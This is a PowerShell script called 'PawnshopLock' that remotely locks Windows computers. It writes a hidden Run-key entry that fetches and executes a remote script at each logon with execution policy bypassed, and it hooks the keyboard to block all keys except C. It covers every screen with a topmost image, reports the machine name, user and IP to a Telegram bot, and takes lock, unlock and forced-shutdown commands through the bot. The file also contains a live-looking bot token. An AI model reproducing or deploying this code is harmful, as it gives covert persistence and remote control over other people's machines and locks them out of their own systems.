# =========================================================
# PawnshopLock v5.1 – background listener + auto‑startup
# =========================================================
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ---------- USER SETTINGS --------------------------------
$imageURL = 'https://raw.githubusercontent.com/diezul/x/main/1.png'
$botToken = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'
$chatID   = '656189986'
# ----------------------------------------------------------

# ---------- AUTORUN (one‑time) ----------------------------
$runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$val    = 'PawnshopLock'
$rawURL = 'https://raw.githubusercontent.com/diezul/x/main/pawnlock.ps1'
$cmd    = "powershell -w hidden -ep Bypass -Command `"iwr $rawURL | iex`""
try {
    if ((Get-ItemProperty $runKey -Name $val -ErrorAction SilentlyContinue).$val -ne $cmd) {
        New-Item -Path $runKey -Force | Out-Null
        Set-ItemProperty -Path $runKey -Name $val -Value $cmd
    }
} catch {}

# ---------- VARIABLES ------------------------------------
$user      = $env:USERNAME
$pc        = $env:COMPUTERNAME
$lockCmd   = "/lock$user".ToLower()
$unlockCmd = "/unlock$user".ToLower()
$shutCmd   = "/shutdown$user".ToLower()

$tempImg   = "$env:TEMP\pawnlock.jpg"
try { Invoke-WebRequest $imageURL -OutFile $tempImg -UseBasicParsing } catch {}

function TG([string]$m) {
    try {
        @{chat_id=$chatID;text=$m} |
            ConvertTo-Json -Compress |
            Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" `
                              -Method POST -ContentType 'application/json' -TimeoutSec 10
    } catch {}
}
function IPs {
    try {
        (Get-NetIPAddress -AddressFamily IPv4 |
            Where-Object { $_.IPAddress -notmatch '^(127|169\.254|0\.|255|fe80)' })[0].IPAddress
    } catch { 'n/a' }
}

# ---------- KEYBLOCKER (block everything except C) -------
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KB {
    static IntPtr h = IntPtr.Zero;
    delegate IntPtr P(int n, IntPtr w, IntPtr l);
    static P d = Hook;
    const int WH = 13, WM1 = 0x100, WM2 = 0x104;
    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id, P cb, IntPtr m, uint t);
    [DllImport("user32.dll")] static extern bool    UnhookWindowsHookEx(IntPtr h);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);

    public static void Block()   { if (h == IntPtr.Zero) h = SetWindowsHookEx(WH, d, GetModuleHandle(null), 0); }
    public static void Unblock() { if (h != IntPtr.Zero) { UnhookWindowsHookEx(h); h = IntPtr.Zero; } }

    static IntPtr Hook(int n, IntPtr w, IntPtr l) {
        if (n >= 0 && (w == (IntPtr)WM1 || w == (IntPtr)WM2)) {
            int vk = Marshal.ReadInt32(l);
            if (vk == 0x43) return CallNextHookEx(h, n, w, l); // allow 'C'
            return (IntPtr)1;                                  // block others
        }
        return CallNextHookEx(h, n, w, l);
    }
}
"@

# ---------- OVERLAY WINDOW --------------------------------
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$forms = $null
function Show-Lock {
    if ($forms) { return }
    [KB]::Block()
    $forms = @()
    foreach ($s in [Windows.Forms.Screen]::AllScreens) {
        $f = New-Object Windows.Forms.Form -Property @{
            FormBorderStyle = 'None'; WindowState = 'Maximized'; StartPosition = 'Manual'
            TopMost = $true; Location = $s.Bounds.Location; Size = $s.Bounds.Size
            BackColor = 'Black'; KeyPreview = $true
        }
        $pb = New-Object Windows.Forms.PictureBox -Property @{
            Image = [Drawing.Image]::FromFile($tempImg); Dock = 'Fill'; SizeMode = 'StretchImage'
        }
        $f.Controls.Add($pb)
        $f.Add_Deactivate({ $_.Activate() })
        $f.Add_KeyDown({ if ($_.KeyCode -eq 'C') { Hide-Lock }; $_.Handled = $true })
        $f.Show()
        $forms += $f
    }
    TG "🔒 $pc locked."
}
function Hide-Lock {
    if (!$forms) { return }
    foreach ($f in $forms) { try { $f.Close() } catch {} }
    $forms = $null
    [KB]::Unblock()
    TG "🔓 $pc unlocked."
}

# ---------- ONLINE PING -----------------------------------
TG "✅ Service online on $pc ($user) | IP: $(IPs())`nCmds: $lockCmd $unlockCmd $shutCmd"

# ---------- TELEGRAM LOOP ---------------------------------
$offset = 0
while ($true) {
    try {
        $u = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?timeout=25&offset=$offset" -TimeoutSec 30
        foreach ($m in $u.result) {
            $offset = $m.update_id + 1
            $txt = $m.message.text.ToLower()
            # remove bot mention & white‑space
            $txt = $txt -replace "@\\S+", "" -replace "\\s+", ""
            if ($m.message.chat.id -ne [int]$chatID) { continue }

            switch ($txt) {
                { $_ -eq $lockCmd }   { Show-Lock; break }
                { $_ -eq $unlockCmd } { Hide-Lock; break }
                { $_ -eq $shutCmd }   { TG "⏹ Shutting down $pc"; Stop-Computer -Force }
            }
        }
    } catch {
        Start-Sleep 5
    }
    # keeps the overlay responsive
    [System.Windows.Forms.Application]::DoEvents()
}
